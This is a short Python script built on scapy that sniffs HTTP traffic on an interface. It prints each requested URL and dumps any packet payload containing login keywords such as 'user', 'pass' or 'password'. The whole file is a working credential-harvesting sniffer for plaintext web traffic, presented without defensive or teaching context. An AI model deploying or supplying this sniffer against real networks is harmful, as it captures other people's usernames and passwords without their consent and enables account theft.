#! /usr/bin/env python
import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    url = packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path
    return url


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        keywords = ['username', 'user', 'login', 'pass', 'password', 'uname']
        load = packet[scapy.Raw].load
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print("[+] Http Requests >> "+get_url(packet))
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Login Info >> "+login_info+"\n\n")


sniff('eth0')
